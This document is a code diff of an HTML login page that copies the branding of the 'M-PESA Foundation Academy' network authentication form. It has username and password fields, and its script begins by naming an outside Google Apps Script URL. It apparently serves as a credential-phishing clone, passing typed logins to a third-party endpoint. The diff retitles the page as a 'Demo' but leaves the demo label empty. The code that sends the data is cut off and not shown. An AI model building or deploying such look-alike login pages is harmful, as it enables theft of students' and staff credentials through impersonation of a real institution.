@@ -3,132 +3,143 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>M-PESA Foundation Academy — Login</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;600&display=swap" rel="stylesheet" />
+<title>Network Authentication - Demo</title>
 <style>
-  :root {
-    --bg: #ffffff;
-    --green: #4fa03e;
-    --logo-color: #66993a;
-    --label-color: #305b99;
-    --footer-color: #666666;
-    --text-color: #222222;
-    --input-bg: #f8fafb;
-    --input-border: #eceff2;
-    --placeholder-color: #b1b5bc;
-    --header-text-color: #2b5e90;
-  }
   * {
+    margin: 0;
+    padding: 0;
     box-sizing: border-box;
   }
-  body, html {
-    margin: 0;
-    height: 100%;
-    background: var(--bg);
-    font-family: 'Inter', system-ui, Arial, sans-serif;
-    color: var(--text-color);
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    padding: 20px;
+  body {
+    font-family: Arial, Helvetica, sans-serif;
+    background: #ffffff;
+    color: #555;
+    min-height: 100vh;
   }
   .top-text {
-    font-weight: 400;
-    font-size: 14px;
-    margin-bottom: 8px;
-    color: var(--text-color);
-    user-select: none;
-  }
-  .top-text span {
-    padding: 0 6px;
-  }
-  .logo {
-    font-weight: 600;
-    font-size: 18px;
-    letter-spacing: 1.5px;
-    color: var(--logo-color);
-    margin-bottom: 20px;
-    user-select: none;
-  }
-  .card {
-    background: #fff;
-    box-shadow: 0 8px 28px rgba(15,23,42,0.06);
-    border-radius: 6px;
-    padding: 46px 64px;
-    max-width: 420px;
+    position: absolute;
+    top: 8.1%;
     width: 100%;
     text-align: center;
+    font-size: 16px;
   }
-  .form-title {
+  .container {
+    position: absolute;
+    top: 22%;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 325px;
+    text-align: center;
+  }
+  .logo {
+    color: #66ad29;
+    font-size: 19px;
+    font-weight: 800;
+    line-height: 19px;
+    margin-bottom: 13px;
+    letter-spacing: -0.5px;
+  }
+  .logo span {
+    display: block;
+  }
+  .login-box {
+    border-left: 1px solid #d8dce0;
+    border-right: 1px solid #d8dce0;
+    border-bottom: 1px solid #d8dce0;
+    padding: 41px 29px 42px;
+    min-height: 368px;
+  }
+  .demo-label {
+    color: #a05b00;
+    font-size: 11px;
+    margin-bottom: 15px;
+  }
+  h3 {
+    color: #3373ae;
+    font-size: 16px;
     font-weight: 600;
-    font-size: 20px;
-    color: var(--label-color);
-    margin-bottom: 20px;
-    user-select: none;
+    margin-bottom: 25px;
+    white-space: nowrap;
   }
-  input[type="text"], input[type="password"] {
+  input {
     width: 100%;
-    padding: 14px 16px;
-    border-radius: 10px;
-    border: 1px solid var(--input-border);
-    background: var(--input-bg);
-    font-size: 15px;
-    font-weight: 300;
-    color: var(--text-color);
-    margin-bottom: 18px;
+    height: 36px;
+    border: 2px solid #e2e6e9;
+    border-radius: 8px;
+    padding: 0 10px;
+    font-size: 14px;
+    margin-bottom: 26px;
+    outline: none;
   }
   input::placeholder {
-    color: var(--placeholder-color);
-    font-weight: 300;
+    color: #cbd0d4;
   }
-  button.login-btn {
+  input:focus {
+    border-color: #8dbbdf;
+  }
+  button {
     width: 100%;
-    background-color: var(--green);
-    color: #fff;
+    height: 36px;
+    background: #3eae32;
+    color: white;
     border: none;
-    font-weight: 600;
-    border-radius: 8px;
-    padding: 12px 18px;
+    border-radius: 4px;
+    font-size: 14px;
+    font-weight: bold;
     cursor: pointer;
-    font-size: 16px;
-    user-select: none;
   }
-  .user-portal {
-    margin: 24px 0 0 0;
-    font-size: 15px;
-    font-weight: 500;
-    color: var(--footer-color);
-    user-select: none;
+  .portal {
+    margin-top: 53px;
+    font-size: 14px;
+    font-weight: bold;
+    color: #666;
   }
-  .footer-text {
+  .footer {
+    position: absolute;
+    top: 72.7%;
     width: 100%;
-    max-width: 720px;
-    font-weight: 400;
-    font-size: 15px;
-    color: var(--footer-color);
-    margin-top: 36px;
-    user-select: none;
+    text-align: center;
+    font-size: 16px;
+    white-space: nowrap;
+  }
+  @media (max-width: 500px) {
+    .container {
+      top: 20%;
+      width: min(325px, 90%);
+    }
+    .footer {
+      top: 75%;
+      padding: 0 15px;
+      white-space: normal;
+      line-height: 1.8;
+    }
   }
 </style>
 </head>
 <body>
 <div class="top-text">
-  Thinkers <span>:</span> Doers <span>:</span> Leaders
+  Thinkers : Doers : Leaders
 </div>
-<div class="logo">M-PESA FOUNDATION ACADEMY</div>
-<div class="card" role="main" aria-label="Network Authentication Form">
-  <div class="form-title">Network Authentication Form</div>
-  <form id="loginForm">
-    <input type="text" id="username" name="username" placeholder="Enter your Username" required autocomplete="username" />
-    <input type="password" id="password" name="password" placeholder="Enter your Password" required autocomplete="current-password" />
-    <button class="login-btn" type="submit">Login</button>
-  </form>
-  <div class="user-portal">Click here to access User Portal</div>
-</div>
-<div class="footer-text">
+<main class="container">
+  <div class="logo">
+    <span>M-PESA</span>
+    <span>FOUNDATION</span>
+    <span>ACADEMY</span>
+  </div>
+  <section class="login-box">
+    <div class="demo-label"></div>
+    <h3>Network Authentication Form</h3>
+    <form id="loginForm">
+      <input type="text" id="username" name="username" placeholder="Enter your Username" required autocomplete="username" />
+      <input type="password" id="password" name="password" placeholder="Enter your Password" required autocomplete="current-password" />
+      <button class="login-btn" type="submit">Login</button>
+    </form>
+    <div class="portal">Click here to access User Portal</div>
+  </section>
+</main>
+<footer class="footer">
   Curiosity : Leadership : Accountability : Innovation : Responsible Citizenship : Excellence
-</div>
+</footer>
 <script>
   const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwYOsSonTJ4W0Aduq-IygbHGUcm6cH-c-A-W5JNKVQjOBVPrUtbpgi4X9hpfslX586G/exec";
 
